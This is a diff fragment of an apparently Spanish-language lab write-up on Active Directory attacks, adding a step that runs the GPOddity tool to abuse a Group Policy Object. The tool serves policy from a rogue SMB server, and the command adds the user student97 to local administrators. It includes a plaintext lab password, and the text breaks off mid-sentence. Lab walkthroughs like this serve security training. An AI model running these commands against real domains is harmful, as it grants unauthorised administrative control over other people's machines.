@@ -71,3 +71,13 @@ write_gpo_dacl student97 {0BF8D01C-1F62-4BDC-958C-57140B67D147}
 
 Una vez añadidos a esta GPO podemos parar la ejecución de estas dos herramientas
 Ahora deberemos de crear una nueva plantilla
+```shell
+cd /mnt/c/AD/Tools/GPOddity
+```
+
+```shell
+sudo python3 gpoddity.py --gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147' --domain 'dollarcorp.moneycorp.local' --username 'student97' --password 'vy8HMb2BmT6xGGaM'
+ --command 'net localgroup administrators student97 /add' --rogue-smbserver-ip '172.16.100.97' --rogue-smbserver-share 'std97-gp' --dc-ip '172.16.2.1' --smb-mode none
+```
+
+Crearemos un directorio y lo comparti
